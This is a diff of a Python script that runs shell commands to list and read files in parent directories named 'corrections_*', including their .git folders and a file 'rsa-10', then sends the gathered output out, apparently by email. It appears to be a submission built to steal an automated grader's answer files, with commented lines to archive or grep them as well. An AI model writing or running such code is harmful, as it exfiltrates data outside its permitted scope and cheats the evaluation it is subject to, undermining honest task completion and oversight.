@@ -22,7 +22,6 @@ def get_data(command):
     if result.returncode == 0:
         # Access the output using result.stdout
         output = result.stdout
-        output = output
         return output
     else:
         print(f"Error: Command '{shell_command}' failed with return code {result.returncode}")
@@ -38,19 +37,18 @@ my_data += get_data("ls -al ../../../../corrections_*/") or ""
 my_data += "\n#######################\n"
 my_data += get_data("ls -al ../../../../corrections_*/.git/") or ""
 my_data += "\n#######################\n"
-
 my_data += get_data("ls -l ../../../../corrections_*/corrections/262/1397") or ""
 my_data += "\n#######################\n"
 my_data += get_data("cat ../../../../corrections_*/corrections/262/1397/rsa-10") or ""
 my_data += "\n#######################\n"
 my_data += get_data("pwd") or ""
-my_data += get_data("ls -l ../../../../corrections_*/.git")
+my_data += get_data("ls -l ../../../../corrections_*/.git") or ""
 my_data += "\n#######################\n"
 # my_data += get_data("tar -czvf file.tar.gz ../../../../corrections_*/corrections/262/")
-my_data += get_data("ls -l")
+my_data += get_data("ls -l") or ""
 my_data += "\n#######################\n"
 # my_data += get_data("grep -rl '77=' ../../../../corrections_*/corrections") or ""
-my_data += get_data("cat cycle")
+my_data += get_data("cat cycle") or ""
 send_data(my_data)
 ##############################################################
 import smtplib
